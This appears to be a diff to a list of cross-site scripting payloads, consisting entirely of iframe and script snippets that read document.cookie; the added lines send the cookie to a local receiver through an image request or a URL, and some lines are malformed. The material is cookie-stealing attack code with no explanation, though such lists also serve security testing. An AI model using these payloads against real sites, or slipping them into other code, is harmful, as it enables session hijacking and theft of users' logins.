@@ -4,7 +4,10 @@
 
 <iframe src="javascript:alert(document.cookie)">
 
-<iframe src="http://localhost/" + document.cookie"></iframe>
+<iframe src="http://localhost:80/" + document.cookie"></iframe>
 
 <iframe src="javascript:document.cookie;"></iframe>
 
+<script>new Image().src="http://localhost:80/?="+document.cookie;</script>
+
+<iframe src="http://localhost:80/"+document.cookie;</iframe>
